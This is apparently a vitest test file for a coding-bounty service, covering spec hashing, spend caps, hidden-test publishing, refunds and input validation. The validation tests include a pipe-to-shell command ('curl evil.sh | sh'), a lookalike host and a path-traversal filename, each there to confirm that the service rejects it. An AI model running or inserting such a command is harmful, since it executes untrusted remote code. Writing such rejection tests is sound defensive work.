import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { keccak256, stringToHex } from "viem";
import { canonicalJson, type CalibrationReport, type TaskSpec } from "@ethernals/shared";

await vi.hoisted(async () => {
  const { setTestEnv } = await import("./_env");
  setTestEnv("tasks");
});

const upload = vi.hoisted(() => vi.fn());
const calibrate = vi.hoisted(() => vi.fn());
const reveal = vi.hoisted(() => vi.fn());
vi.mock("../src/verifier-client", async (original) => ({ ...(await original<object>()), uploadHiddenTests: upload, calibrateTests: calibrate, getRevealedTests: reveal }));

const { getDb, getTask, listSpendEvents, updateTask } = await import("../src/db");
const { DirectGuard, MAX_DIRECT_SPENDS_PER_HOUR, recordSpend } = await import("../src/spend");
const { SpendBlockedError, areTestsPublic, canRefund, createTask, loadTemplate, publishedTests, refundEligibleAt, specHashOf, testsHashOf, tryOverspend, validationRequestHash, REFUND_GRACE_MS } = await import("../src/task-service");
const { createDuelSchema, createTaskSchema, draftTestsSchema } = await import("../src/task-schemas");
const { taskView } = await import("../src/views");
const { agent, person, task } = await import("./_fixtures");
const { isAllowedRepo } = await import("../src/coding-agent");

const spec: TaskSpec = { version: 1, kind: "code-fix", language: "python", title: "Fix", repoUrl: "https://github.com/a/b", baseCommit: "a".repeat(40), issue: "Broken." };
const ACCOUNT = "0x00000000000000000000000000000000000000aa" as const;
const goodReport: CalibrationReport = { ok: true, base: { realFailures: 2, testsPassed: 1, testsFailed: 2, testsErrored: 0 }, reference: "passed", naive: "rejected", reasons: [], isolation: "docker" };
const request = (amountUsdc: string) => ({ chainId: "eip155:11155111" as const, calls: [{ to: ACCOUNT, data: "0x" as const }], purpose: "fund", amountUsdc });

beforeEach(() => {
  calibrate.mockReset();
  calibrate.mockResolvedValue(goodReport);
  reveal.mockReset();
});

describe("hashes", () => {
  it("hashes the spec's canonical JSON, whatever the key order", () => {
    const reordered = { baseCommit: spec.baseCommit, issue: spec.issue, kind: spec.kind, language: spec.language, repoUrl: spec.repoUrl, title: spec.title, version: spec.version } as TaskSpec;
    expect(specHashOf(reordered)).toBe(specHashOf(spec));
    expect(specHashOf(spec)).toBe(keccak256(stringToHex(canonicalJson(spec))));
    expect(canonicalJson(spec).startsWith('{"baseCommit":')).toBe(true);
  });

  it("sorts hidden test files by path before hashing", () => {
    const a = { path: "tests_hidden/a.py", content: "1" };
    const b = { path: "tests_hidden/b.py", content: "2" };
    expect(testsHashOf({ files: [b, a] })).toBe(testsHashOf({ files: [a, b] }));
    expect(testsHashOf({ files: [a, b] })).toBe(keccak256(stringToHex(canonicalJson({ files: [a, b] }))));
  });

  it("hashes the ERC-8004 request canonically", () => {
    const h = (c: string) => `0x${c.repeat(64)}` as const;
    const hash = validationRequestHash({ testsHash: h("c"), patchHash: h("b"), specHash: h("a"), chainTaskId: "7" });
    expect(hash).toBe(keccak256(stringToHex(`{"chainTaskId":"7","patchHash":"${h("b")}","specHash":"${h("a")}","testsHash":"${h("c")}"}`)));
  });
});

describe("DirectGuard", () => {
  it("sends every call and confirms within the cap", async () => {
    const send = vi.fn().mockResolvedValue(`0x${"1".repeat(64)}`);
    const result = await new DirectGuard(person(), ACCOUNT, send).execute(request("10.000000"));
    expect(result.status).toBe("confirmed");
    expect(send).toHaveBeenCalledTimes(1);
  });

  it("blocks above the cap and sends nothing", async () => {
    const send = vi.fn();
    const result = await new DirectGuard(person(), ACCOUNT, send).execute(request("10.000001"));
    expect(result).toMatchObject({ status: "blocked", rule: "direct-cap" });
    expect(send).not.toHaveBeenCalled();
  });

  it("blocks above the hourly counter", async () => {
    const owner = person();
    const confirmed = { status: "confirmed", guard: "direct", txHash: `0x${"1".repeat(64)}`, submissionId: null } as const;
    for (let i = 0; i < MAX_DIRECT_SPENDS_PER_HOUR; i++) {
      recordSpend({ person: owner, taskId: null, guard: "direct", purpose: "x", amountUnits: 1n, result: confirmed });
    }
    const send = vi.fn();
    expect(await new DirectGuard(owner, ACCOUNT, send).execute(request("1.000000"))).toMatchObject({ status: "blocked", rule: "direct-cap" });
    expect(send).not.toHaveBeenCalled();
  });

  it("reports a failed transaction instead of throwing", async () => {
    const send = vi.fn().mockRejectedValue(new Error("out of gas\nstack"));
    expect(await new DirectGuard(person(), ACCOUNT, send).execute(request("1.000000"))).toEqual({ status: "failed", guard: "direct", error: "out of gas" });
  });
});

describe("a blocked bounty", () => {
  it("creates no on-chain task, records the attempt and answers 409 with the rule", async () => {
    const client = person();
    agent(client, { kind: "buyer", task_type: null });
    const hidden = { files: [{ path: "tests_hidden/t.py", content: "assert True" }] };
    upload.mockResolvedValue({ testsId: "t1", testsHash: testsHashOf(hidden) });

    const attempt = createTask(client, { spec: { title: spec.title, repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, issue: spec.issue }, hiddenTests: hidden, bounty: "50", deadlineMinutes: 30 });
    const error = await attempt.catch((e: unknown) => e);
    expect(error).toBeInstanceOf(SpendBlockedError);
    expect(error).toMatchObject({ status: 409, rule: "direct-cap", details: { blocked: true } });

    const [event] = listSpendEvents(client.id);
    expect(event).toMatchObject({ status: "blocked", rule: "direct-cap", guard: "direct", tx_hash: null, amount_units: "50000000" });
    const row = getTask(event.task_id!)!;
    expect(row).toMatchObject({ status: "error", chain_task_id: null, create_tx: null });
  });

  it("refuses a verifier that commits to a different tests hash", async () => {
    const client = person();
    agent(client, { kind: "buyer", task_type: null });
    upload.mockResolvedValue({ testsId: "t2", testsHash: `0x${"9".repeat(64)}` });
    await expect(
      createTask(client, { spec: { title: spec.title, repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, issue: spec.issue }, hiddenTests: { files: [{ path: "t.py", content: "x" }] }, bounty: "2", deadlineMinutes: 30 }),
    ).rejects.toThrow(/different tests hash/);
  });

  it("never keeps hidden test contents", async () => {
    const client = person();
    agent(client, { kind: "buyer", task_type: null });
    const hidden = { files: [{ path: "t.py", content: "UNIQUE_HIDDEN_ASSERTION" }] };
    upload.mockResolvedValue({ testsId: "t3", testsHash: testsHashOf(hidden) });
    await createTask(client, { spec: { title: spec.title, repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, issue: spec.issue }, hiddenTests: hidden, bounty: "50", deadlineMinutes: 30 }).catch(() => {});
    const everything = getDb().prepare("SELECT * FROM tasks").all();
    expect(JSON.stringify(everything)).not.toContain("UNIQUE_HIDDEN_ASSERTION");
  });
});

describe("checking tests before funding", () => {
  const body = { spec: { title: spec.title, repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, issue: spec.issue }, bounty: "50", deadlineMinutes: 30 };
  const setup = (content: string) => {
    const client = person();
    agent(client, { kind: "buyer", task_type: null });
    const hiddenTests = { files: [{ path: "tests_hidden/test_x.py", content }] };
    upload.mockResolvedValue({ testsId: "c1", testsHash: testsHashOf(hiddenTests) });
    return { client, hiddenTests };
  };

  it("refuses tests the verifier rules out: no task row, no spend attempt, and the reason shown", async () => {
    const { client, hiddenTests } = setup("assert True");
    calibrate.mockResolvedValue({ ...goodReport, ok: false, reasons: ["The tests already pass on the unfixed code."] });
    const before = getDb().prepare("SELECT COUNT(*) AS n FROM tasks").get() as { n: number };

    const error = await createTask(client, { ...body, hiddenTests }).catch((e: unknown) => e);
    expect(error).toMatchObject({ status: 422, message: expect.stringContaining("already pass") });
    expect(getDb().prepare("SELECT COUNT(*) AS n FROM tasks").get()).toEqual(before);
    expect(listSpendEvents(client.id)).toEqual([]);
  });

  it("sends the commit, the tests and the client's patches to the check", async () => {
    const { client, hiddenTests } = setup("x");
    await createTask(client, { ...body, hiddenTests, checks: { referencePatch: "REF", naivePatch: "" } }).catch(() => {});
    expect(calibrate).toHaveBeenCalledWith(expect.objectContaining({ repoUrl: spec.repoUrl, baseCommit: spec.baseCommit, testsId: "c1", testCommand: "pytest -q", referencePatch: "REF", naivePatch: undefined }));
  });

  it("keeps the report but never the patches", async () => {
    const { client, hiddenTests } = setup("x");
    await createTask(client, { ...body, hiddenTests, checks: { referencePatch: "UNIQUE_REFERENCE_FIX" } }).catch(() => {});
    const [event] = listSpendEvents(client.id);
    expect(JSON.parse(getTask(event.task_id!)!.calibration_json!)).toEqual(goodReport);
    expect(JSON.stringify(getDb().prepare("SELECT * FROM tasks").all())).not.toContain("UNIQUE_REFERENCE_FIX");
  });
});

describe("publishing tests", () => {
  const files = [{ path: "tests_hidden/test_x.py", content: "def test(): pass" }];
  const testsHash = testsHashOf({ files });
  const calibration_json = JSON.stringify(goodReport);
  let n = 0;
  const settled = (fields: Parameters<typeof task>[2] = {}) => {
    const client = person();
    const buyer = agent(client, { kind: "buyer", task_type: null });
    return task(client, buyer, { status: "passed", calibration_json, tests_hash: testsHash, tests_id: `pub${++n}`, ...fields });
  };

  it("publishes custom tests once a task has passed or failed", () => {
    expect(areTestsPublic(settled())).toBe(true);
    expect(areTestsPublic(settled({ status: "failed" }))).toBe(true);
    expect(taskView(settled())).toMatchObject({ testsUrl: expect.stringMatching(/\/tests\.json$/), calibration: goodReport });
  });

  it.each(["open", "accepted", "submitted", "verifying", "refunded", "error"] as const)("keeps them hidden while a task is %s", (status) => {
    const row = settled({ status });
    expect(areTestsPublic(row)).toBe(false);
    expect(taskView(row).testsUrl).toBeNull();
  });

  it("keeps templates and older tasks hidden, since neither has a calibration", () => {
    expect(areTestsPublic(settled({ calibration_json: null, template: "slugify" }))).toBe(false);
  });

  it("holds them back while another live task shares them, and not for one that never went on-chain", () => {
    const first = settled();
    const second = settled({ tests_id: first.tests_id, status: "verifying" });
    expect(areTestsPublic(first)).toBe(false);
    updateTask(second.id, { status: "error", chain_task_id: null });
    expect(areTestsPublic(first)).toBe(true);
  });

  it("serves tests that match the on-chain hash", async () => {
    reveal.mockResolvedValue({ testsId: "x", testsHash, files });
    await expect(publishedTests(settled())).resolves.toEqual({ testsHash, files, calibration: goodReport });
  });

  it("refuses tests that do not match the hash, and asks the verifier for nothing while hidden", async () => {
    reveal.mockResolvedValue({ testsId: "x", testsHash, files: [{ path: "tests_hidden/test_x.py", content: "swapped" }] });
    await expect(publishedTests(settled())).rejects.toThrow(/do not match/);
    reveal.mockClear();
    await expect(publishedTests(settled({ status: "verifying" }))).rejects.toThrow(/hidden/);
    expect(reveal).not.toHaveBeenCalled();
  });
});

describe("the overspend demo", () => {
  it("is blocked by the direct guard and moves nothing", async () => {
    const owner = person();
    const send = vi.fn();
    const event = await tryOverspend(owner, new DirectGuard(owner, ACCOUNT, send));
    expect(event).toMatchObject({ status: "blocked", rule: "direct-cap", amountUsdc: "50.000000" });
    expect(send).not.toHaveBeenCalled();
  });

  it("refuses to send when the policy shows no cap", async () => {
    const owner = person();
    const execute = vi.fn();
    const guard = { kind: "namera", address: async () => ACCOUNT, policy: async () => ({ tokenAllowanceUsdc: null, accountAddress: ACCOUNT }), execute } as never;
    const event = await tryOverspend(owner, guard);
    expect(event.status).toBe("failed");
    expect(event.reason).toMatch(/Refused to send/);
    expect(execute).not.toHaveBeenCalled();
  });
});

describe("the slugify template", () => {
  it("reads the issue from its file, and asks for the repo until task.json has one", async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "ethernals-template-"));
    fs.mkdirSync(path.join(dir, "slugify/hidden_tests/tests_hidden"), { recursive: true });
    fs.writeFileSync(path.join(dir, "slugify/issue.md"), "Slugify breaks on accents.\n");
    fs.writeFileSync(path.join(dir, "slugify/hidden_tests/tests_hidden/test_x.py"), "assert True");
    const write = (fields: object) => fs.writeFileSync(path.join(dir, "slugify/task.json"), JSON.stringify({ title: "Fix", issueFile: "issue.md", testCommand: "pytest -q", ...fields }));

    write({ repoUrl: "", baseCommit: "" });
    await expect(loadTemplate("slugify", dir)).rejects.toThrow(/no repo yet/);

    write({ repoUrl: "https://github.com/a/b", baseCommit: "a".repeat(40) });
    const template = await loadTemplate("slugify", dir);
    expect(template.spec.issue).toBe("Slugify breaks on accents.");
    expect(template.hiddenTests.files.map((f) => f.path)).toEqual(["tests_hidden/test_x.py"]);
  });
});

describe("refund eligibility", () => {
  const deadline = "2026-11-06T10:00:00.000Z";
  const at = new Date(deadline).getTime();

  it("opens at the deadline for work nobody submitted", () => {
    for (const status of ["open", "accepted"] as const) {
      expect(canRefund(status, deadline, at - 1)).toBe(false);
      expect(canRefund(status, deadline, at)).toBe(true);
    }
  });

  it("gives submitted work 30 more minutes for the verifier to settle", () => {
    for (const status of ["submitted", "verifying"] as const) {
      expect(canRefund(status, deadline, at)).toBe(false);
      expect(canRefund(status, deadline, at + REFUND_GRACE_MS - 1)).toBe(false);
      expect(canRefund(status, deadline, at + REFUND_GRACE_MS)).toBe(true);
    }
  });

  it("never refunds a finished task", () => {
    for (const status of ["passed", "failed", "refunded", "creating"] as const) {
      expect(refundEligibleAt(status, deadline)).toBeNull();
      expect(canRefund(status, deadline, at * 2)).toBe(false);
    }
  });
});

describe("API validation", () => {
  const base = { spec: { title: "Fix it", repoUrl: "https://github.com/a/b", baseCommit: "a".repeat(40), issue: "It is broken." }, hiddenTests: { files: [{ path: "t.py", content: "x" }] }, bounty: "2.00", deadlineMinutes: 30 };
  const issue = (body: unknown) => createTaskSchema.safeParse(body).error?.issues[0]?.message;

  it("accepts a good request and a template", () => {
    expect(issue(base)).toBeUndefined();
    expect(issue({ template: "slugify", bounty: "2", deadlineMinutes: 30 })).toBeUndefined();
  });

  it.each(["http://github.com/a/b", "https://gitlab.com/a/b", "https://github.com.evil.io/a/b", "https://github.com/a", "git@github.com:a/b.git", "https://github.com/a/b/../c/d"])(
    "rejects the repo %s",
    (repoUrl) => {
      expect(issue({ ...base, spec: { ...base.spec, repoUrl } })).toMatch(/github\.com/);
      expect(isAllowedRepo(repoUrl)).toBe(false);
    },
  );

  it("accepts a normal GitHub repo", () => {
    expect(isAllowedRepo("https://github.com/owner/repo.git")).toBe(true);
  });

  it("enforces the bounty limits", () => {
    expect(issue({ ...base, bounty: "0" })).toMatch(/smallest/);
    expect(issue({ ...base, bounty: "1000.01" })).toMatch(/largest/);
    expect(issue({ ...base, bounty: "abc" })).toMatch(/number/);
    expect(issue({ ...base, bounty: "1000" })).toBeUndefined();
  });

  it("enforces the deadline limits", () => {
    expect(issue({ ...base, deadlineMinutes: 1 })).toMatch(/at least/);
    expect(issue({ ...base, deadlineMinutes: 2000 })).toMatch(/at most/);
  });

  it("rejects a short commit, a non-pytest command and a path out of the repo", () => {
    expect(issue({ ...base, spec: { ...base.spec, baseCommit: "abc123" } })).toMatch(/40-character/);
    expect(issue({ ...base, spec: { ...base.spec, testCommand: "curl evil.sh | sh" } })).toMatch(/pytest/);
    expect(issue({ ...base, hiddenTests: { files: [{ path: "../x.py", content: "x" }] } })).toMatch(/inside the repo/);
  });

  it("accepts patches to check against, up to the verifier's limit", () => {
    expect(issue({ ...base, checks: { referencePatch: "diff", naivePatch: "diff" } })).toBeUndefined();
    expect(issue({ ...base, checks: { referencePatch: "x".repeat(200_001) } })).toMatch(/too long/);
  });

  it("needs a repo, a commit and an issue to draft tests, but no title", () => {
    const { title: _title, ...draft } = base.spec;
    expect(draftTestsSchema.safeParse(draft).success).toBe(true);
    expect(draftTestsSchema.safeParse({ ...draft, baseCommit: "abc" }).success).toBe(false);
    expect(draftTestsSchema.safeParse({ ...draft, repoUrl: "https://gitlab.com/a/b" }).success).toBe(false);
  });

  it("needs a template or a spec with tests", () => {
    expect(issue({ bounty: "2", deadlineMinutes: 30 })).toMatch(/template/);
  });

  it("validates duels", () => {
    expect(createDuelSchema.safeParse({ template: "slugify", specialists: ["a", "b"], bounty: "2" }).success).toBe(true);
    expect(createDuelSchema.safeParse({ template: "slugify", specialists: ["a"], bounty: "2" }).success).toBe(false);
  });
});
